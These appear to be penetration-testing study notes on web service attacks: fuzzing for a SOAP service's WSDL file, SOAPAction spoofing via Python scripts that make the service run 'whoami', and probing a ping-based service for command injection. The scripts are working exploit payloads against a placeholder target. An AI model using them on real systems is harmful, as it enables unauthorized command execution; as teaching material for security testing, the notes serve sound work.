 Web services enable different applications to communicate with each other. An `application programming interface (API)` is a set of rules that enables data transmission between different software. 
- Web services are a type of API, but the opposite is not always true! = some of the web services technologies are XML-RPC, JSON-RPC, SOAP, WS-BPEL, RESTful...
- WSDL (Web Service Description Language) = XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.
We'll want to `find the SOAP web service's WSDL file` if it exists, by fuzzing the web application. If we found a `WSDL` file but we cannot read it, we should fuzz for available parameter to read it
```bash
# Fuzz for parameter to read the WSDL file
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```



# Web Service Attacks
## SOAPAction Spoofing
- Let's say here we've found a `WSDL` file in a `SOAP` web service that we can call & read using the `?wsdl` parameter like `http://<TARGET IP>:3002/wsdl?wsdl`.
SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called `SOAPAction`, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.
- If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing
```bash
# Read the service's WSDL file 
curl http://<TARGET IP>:3002/wsdl?wsdl
```
- Reading the `WSDL` file, we may see a `SOAPAction` operation that do interesting thing. Let's say here we've found one called `ExecuteCommand`. 
- We could look in the `WSDL` file at the `parameters used` by the `SOAPAction` to issues requests & trigger the functionnality
- We could use `python scripts` to try to have the `SOAP` service execute a `whoami` command
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- If we get an error `This function is only allowed in internal networks`, we can try to `spoof the SOAPAction` by specifying `LoginRequest` in `<soap:Body>`, so that our request goes through because this operation is allowed from the outside. 
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- If the web service determines the operation to be executed based solely on the `SOAPAction header`, we may bypass the restrictions and have the SOAP service execute a `whoami` command
## Command Injection
If a web service uses `user-controlled input` to execute a system command on the back-end server, an attacker may be able to exploit it.
- Sometimes it could be a `connectivity-checking` web service that is merely executing a `ping` command towards a website of our choosing. To verify that the app is sending ping requests, we can input our 
```bash
# Listening for incoming ping requests from another host
sudo tcpdump -i tun0 icmp
```
- We could then try to reveal a [[Command Injections]] vulnerability, and then read sensitive files on the system.
